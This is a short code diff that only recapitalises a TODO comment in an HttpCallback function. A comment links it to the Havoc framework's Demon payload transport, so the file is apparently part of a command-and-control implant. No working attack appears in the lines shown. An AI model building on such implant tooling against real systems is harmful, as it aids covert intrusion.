@@ -210,7 +210,7 @@ namespace Network {
 
         BOOL HttpCallback(const _stream *const out, _stream **in) {
             // https://github.com/HavocFramework/Havoc/blob/ea3646e055eb1612dcc956130fd632029dbf0b86/payloads/Demon/src/core/transportHttp.c#L21
-            // todo: reverting tokens during http operations
+            // TODO: reverting tokens during http operations
 
             _proxy_context proxy_ctx = { };
             _request_context req_ctx = { };
